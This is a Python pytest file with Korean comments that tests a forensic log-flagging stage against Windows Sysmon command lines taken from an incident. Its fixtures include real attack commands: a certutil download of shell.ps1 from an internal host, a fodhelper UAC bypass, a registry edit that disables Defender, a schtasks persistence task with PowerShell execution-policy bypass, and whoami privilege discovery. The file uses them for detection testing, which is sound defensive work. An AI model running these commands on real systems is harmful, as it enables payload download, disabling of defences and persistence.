r"""명령행에서 읽는 flags — K-KIOSK-USB-0908 이 놓친 자리.

그 실행에서 침해 체인 전체가 프롬프트에 **실렸는데도** 05단계가 하나도 고르지
않았다. 05 프롬프트가 ``flags`` 를 "이 레코드가 당신에게 온 이유"로 제시하는데
certutil 다운로드·fodhelper·schtasks 등록·Defender 정책 변경이 전부 빈
``flags`` 로 갔기 때문이다. 못 간 것이 아니라 **아무 표시 없이 갔다.**

여기 테스트는 두 가지를 함께 잡는다.

- 그 레코드들이 이제 flag 를 받는가 (아래 실제 명령행은 실측에서 그대로 옮겼다)
- **어휘가 헐거워지지 않았는가** — 정상 명령행에 붙으면 필터가 일을 안 한다.
  실측에서 ``slui.exe`` 71건·``net.exe`` 계열 475건이 그래서 빠졌다.
"""

import pytest

from src.stage04_parse import flagging


def _sysmon(command_line: str, image: str = r"C:\Windows\System32\cmd.exe") -> dict:
    return {
        "ref": "SYSMON#1",
        "artifact": "evtx:Sysmon",
        "record_num": 1,
        "offset": "0x0",
        "event_id": 1,
        "timestamp": "2026-09-07T13:37:57Z",
        "fields": {"Image": image, "CommandLine": command_line},
    }


def _flags(record: dict) -> set[str]:
    return set(flagging.apply(record).get("flags") or [])


# (설명, 명령행, Image, 기대 flag) — 명령행은 K-KIOSK-USB-0908 실측 그대로다.
CAUGHT = [
    (
        "certutil 로 원격 스크립트를 받아 왔다",
        r"certutil  -urlcache -split -f http://192.168.0.153:8000/shell.ps1 C:\Users\kiosk\AppData\Local\Temp\ ",
        r"C:\Windows\System32\certutil.exe",
        "lolbin_download",
    ),
    (
        "자동 승격 실행 파일로 UAC 를 우회했다",
        r'"C:\Windows\System32\fodhelper.exe"',
        r"C:\Windows\System32\fodhelper.exe",
        "uac_bypass_candidate",
    ),
    (
        "Defender 정책 키를 바깥에서 고쳤다",
        r'"C:\Windows\system32\reg.exe" add "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
        r"C:\Windows\System32\reg.exe",
        "security_tool_config_changed",
    ),
    (
        "예약 작업으로 자동 실행을 걸었다 — 따옴표가 도구 이름과 옵션 사이에 낀다",
        r"\"schtasks.exe\" /create /tn Autorun_s_ps1 /tr 'powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\kiosk\\AppData\\Local\\Temp\\s.ps1'",
        r"C:\Windows\System32\schtasks.exe",
        "persistence_command",
    ),
    (
        "권한을 훑었다",
        r'"C:\Windows\system32\whoami.exe" /priv',
        r"C:\Windows\System32\whoami.exe",
        "discovery_command",
    ),
]


@pytest.mark.parametrize(
    "why, command_line, image, expected",
    CAUGHT,
    ids=[item[3] for item in CAUGHT],
)
def test_incident_command_lines_carry_a_reason(why, command_line, image, expected):
    assert expected in _flags(_sysmon(command_line, image)), why


def test_schtasks_is_matched_by_options_not_by_tool_name():
    """도구 이름과 옵션을 붙여 쓴 값으로는 실물이 안 걸린다.

    실제 명령행은 도구 경로가 따옴표로 닫힌 **뒤에** 옵션이 온다. 이 테스트가
    지키는 것은 어휘가 그 형태를 견디는가다 — 처음 쓴 ``schtasks.exe /create``
    는 실측에서 0건이었다.
    """
    quoted = _sysmon(r'"C:\Windows\system32\schtasks.exe" /create /tn AutoRun_s_ps1 /tr "powershell.exe -File s.ps1"')
    bare = _sysmon(r"schtasks /create /tn AutoRun_s_ps1 /tr powershell.exe")

    assert "persistence_command" in _flags(quoted)
    assert "persistence_command" in _flags(bare)


# 정상 명령행. 하나라도 걸리면 그 flag 는 뜻을 잃는다.
BENIGN = [
    ("라이선스 UI — 실측 71건", r'"C:\Windows\System32\SLUI.exe" RuleId=31e71c49;Action=AutoActivate', r"C:\Windows\System32\SLUI.exe"),
    ("감시 에이전트의 계정 열거 — 실측 475건", r'"C:\Windows\system32\net.exe" accounts', r"C:\Windows\System32\net.exe"),
    ("서비스 시작", r'"C:\Windows\system32\net.exe" START WazuhSvc', r"C:\Windows\System32\net.exe"),
    ("인증서 저장소 조회 — certutil 의 정상 용도", r"certutil -store my", r"C:\Windows\System32\certutil.exe"),
    ("예약 작업 조회", r'"C:\Windows\system32\schtasks.exe" /query /fo LIST', r"C:\Windows\System32\schtasks.exe"),
]

NEW_FLAGS = {
    "lolbin_download",
    "uac_bypass_candidate",
    "security_tool_config_changed",
    "persistence_command",
    "discovery_command",
}


@pytest.mark.parametrize("why, command_line, image", BENIGN, ids=[item[0][:24] for item in BENIGN])
def test_ordinary_command_lines_get_no_new_flag(why, command_line, image):
    assert not (_flags(_sysmon(command_line, image)) & NEW_FLAGS), why
